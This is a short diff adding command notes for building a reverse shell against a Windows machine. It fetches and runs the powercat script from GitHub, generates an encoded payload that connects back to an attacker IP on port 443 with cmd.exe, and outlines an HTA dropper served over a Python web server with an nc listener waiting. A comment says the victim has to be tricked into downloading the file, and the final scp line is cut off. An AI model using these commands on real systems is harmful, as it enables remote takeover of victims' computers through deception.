@@ -1,0 +1,19 @@
+#Linux command to create reverse powershell using kali linux pwsh command
+#-ge Generate Encoded
+ATTACKERIP="192.168.31.200"
+pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c $ATTACKERIP -p 443 -e cmd.exe -ge" >rev.bat
+
+#Check the code:
+cat rev.bat|base64 -d
+
+#Create an HTA file that downloads the code and then runs it.
+#This is the hta page: run.hta
+
+#Start an http server so the user can get the hta file and donloade the .bat file
+python3 -m http.server 80
+
+#In another window start the nc to receive the victim's connection
+nc -nvlp 443
+
+#Download the hta file in the windows machine (this step should be done in someway by tricking the client)
+scp marevalo@192.168.31.50
